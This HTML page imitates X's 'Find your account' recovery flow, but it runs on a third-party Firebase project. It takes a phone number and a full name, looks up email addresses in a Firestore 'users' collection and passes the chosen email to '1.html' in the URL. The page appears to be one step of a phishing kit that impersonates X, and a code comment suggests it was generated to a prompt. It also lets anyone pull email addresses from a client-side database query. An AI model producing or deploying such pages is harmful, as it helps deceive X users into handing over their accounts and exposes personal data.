<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Find your X account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .container { width: 100%; max-width: 500px; padding: 20px; }
        h1 { font-size: 24px; margin-bottom: 20px; }
        .input-group { border: 1px solid #cfd9de; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
        .input-group:focus-within { border-color: #1d9bf0; }
        .input-group input { width: 100%; border: none; outline: none; font-size: 16px; }
        .btn { width: 100%; height: 50px; background: #000; color: #fff; border-radius: 25px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }
        .email-list-item { padding: 15px; border-bottom: 1px solid #eee; cursor: pointer; color: #1d9bf0; }
        .email-list-item:hover { background: #f0f0f0; }
    </style>
</head>
<body>

<div class="container">
    <div style="font-size:30px; font-weight:bold; margin-bottom:20px;">X</div>
    
    <div id="step-phone">
        <h1>Find your account</h1>
        <p>Enter your phone number to get started.</p>
        <div class="input-group">
            <input type="tel" id="mobile" placeholder="Phone number">
        </div>
        <button class="btn" onclick="checkPhone()">Next</button>
    </div>

    <div id="step-name" style="display:none;">
        <h1>What's your name?</h1>
        <div class="input-group">
            <input type="text" id="fname" placeholder="First Name">
        </div>
        <div class="input-group">
            <input type="text" id="lname" placeholder="Last Name">
        </div>
        <button class="btn" onclick="checkName()">Next</button>
    </div>

    <div id="step-result" style="display:none;">
        <h1>Choose an account</h1>
        <div id="email-results"></div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDL7sPp-FkG59L-mRQ7BrCGgeKMhQC80iw",
        authDomain: "xperts-metadata.firebaseapp.com",
        projectId: "xperts-metadata",
        storageBucket: "xperts-metadata.firebasestorage.app",
        messagingSenderId: "514845910910",
        appId: "1:514845910910:web:5a2402130a97b5d749b52f",
        measurementId: "G-CQ5KWGJSZB"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const urlParams = new URLSearchParams(window.location.search);
    const urlMobile = urlParams.get('mobile');
    const urlGoto = urlParams.get('goto');

    let phoneToSearch = "";

    window.onload = function() {
        if(urlMobile) {
            document.getElementById('mobile').value = urlMobile;
            phoneToSearch = urlMobile;
            // Skip to name check if mobile provided
            document.getElementById('step-phone').style.display = 'none';
            document.getElementById('step-name').style.display = 'block';
        }
    }

    async function checkPhone() {
        phoneToSearch = document.getElementById('mobile').value.trim();
        if(!phoneToSearch) return alert("Enter phone number");
        
        // In a real app we might verify phone exists first, but here we just ask name
        document.getElementById('step-phone').style.display = 'none';
        document.getElementById('step-name').style.display = 'block';
    }

    async function checkName() {
        const fname = document.getElementById('fname').value.trim();
        const lname = document.getElementById('lname').value.trim();

        if(!fname || !lname) return alert("Enter full name");

        // Query Firestore
        const snapshot = await db.collection('users')
            .where('phone', '==', phoneToSearch)
            .where('firstName', '==', fname)
            .where('lastName', '==', lname)
            .get();

        if(snapshot.empty) {
            alert("No account found with this information.");
            return;
        }

        document.getElementById('step-name').style.display = 'none';
        document.getElementById('step-result').style.display = 'block';
        const list = document.getElementById('email-results');
        
        snapshot.forEach(doc => {
            const data = doc.data();
            const div = document.createElement('div');
            div.className = 'email-list-item';
            div.innerText = data.email;
            div.onclick = function() {
                // Redirect logic
                // if urlGoto exists, maybe do something, but prompt says:
                // redirect to 1.html?email=<clicked>
                window.location.href = `1.html?email=${data.email}`;
            }
            list.appendChild(div);
        });
    }
</script>
</body>
</html>